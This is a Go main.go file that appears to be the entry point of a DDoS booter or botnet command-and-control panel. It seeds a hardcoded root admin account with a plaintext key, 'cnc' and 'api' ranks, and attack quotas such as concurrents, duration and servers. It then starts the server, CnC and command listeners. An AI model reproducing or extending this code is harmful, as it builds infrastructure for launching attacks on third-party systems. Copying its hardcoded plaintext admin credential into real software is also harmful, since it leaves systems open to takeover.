package main

import (
	"api/core"
	"api/core/database"
	"api/core/master"
	"api/core/models"
	"api/core/models/functions"
	"api/core/models/ranks"
	"api/core/models/servers"
	"api/core/net"
	"api/core/net/commands"
	"log"
	"os"
	"time"
)

var logger = log.New(os.Stderr, "[main] ", log.Ltime|log.Lshortfile)

func main() {
	core.Initialize()
	if err := database.New(); err != nil {
		logger.Println("failed to initialize database", err)
		return
	}

	// Adding basic rank
	logger.Printf("Adding basic rank: %v", ranks.Internal["basic"])
	database.Container.NewUser(&database.User{
		ID:         0,
		Username:   "root",
		Key:        []byte("!D3vT34m!"),
		Membership: "admin",
		Ranks: []*ranks.Rank{
			ranks.GetRole("admin", true),
			ranks.GetRole("vip", true),
			ranks.GetRole("api", true),
			ranks.GetRole("cnc", true),
		},
		Concurrents: 10,
		Duration:    200,
		Servers:     10,
		Balance:     1000,
		Expiry:      time.Now().Add(31 * 24 * time.Hour).Unix(),
	})

	if models.Config.Server.Enabled {
		go servers.Listen() 
		go net.Listener()   
		go commands.Init()  
		go func() {
			for {
				master.NewV2()
			}
		}()
	} else {
		logger.Printf("[main] %s main.go CnC Turned Off!\n", time.Now().Format("15:04:05"))
		go servers.Listen()  
		go func() {
			for {
				master.NewV2()
			}
		}()
	}
	functions.CommandListener()

	select {}
}
